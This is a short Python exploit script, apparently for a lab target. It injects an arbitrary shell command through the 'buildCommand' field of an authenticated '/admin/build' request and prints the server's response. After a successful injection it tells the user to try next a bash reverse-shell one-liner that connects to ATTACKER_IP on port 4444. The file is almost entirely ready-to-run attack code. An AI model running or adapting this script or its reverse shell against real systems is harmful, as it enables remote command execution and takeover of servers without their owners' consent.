#!/usr/bin/env python3
"""
Test command injection via admin build endpoint
"""

import sys
import requests
import time

def test_command_injection(target_url, token, command):
    """
    Test command injection in admin build endpoint
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "buildCommand": command
    }
    
    print(f"[+] Sending command injection payload...")
    print(f"[+] Command: {command}")
    
    try:
        response = requests.post(
            f"{target_url}/admin/build",
            json=payload,
            headers=headers,
            timeout=30
        )
        
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response: {json.dumps(response.json(), indent=2)}")
        
        return response.status_code == 200
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 test_command_injection.py <target_url> <jwt_token> [command]")
        print("Example: python3 test_command_injection.py http://10.10.10.10:3000 TOKEN 'id'")
        sys.exit(1)
    
    target_url = sys.argv[1]
    token = sys.argv[2]
    command = sys.argv[3] if len(sys.argv) > 3 else "id"
    
    print("=" * 50)
    print("Command Injection Test")
    print("=" * 50)
    print(f"Target: {target_url}")
    print(f"Command: {command}")
    print()
    
    success = test_command_injection(target_url, token, command)
    
    if success:
        print("\n[+] Command injection successful!")
        print("[+] Try a reverse shell next:")
        print("    bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
    else:
        print("\n[-] Command injection failed")
        print("[-] Check token and endpoint")

if __name__ == "__main__":
    import json
    main()

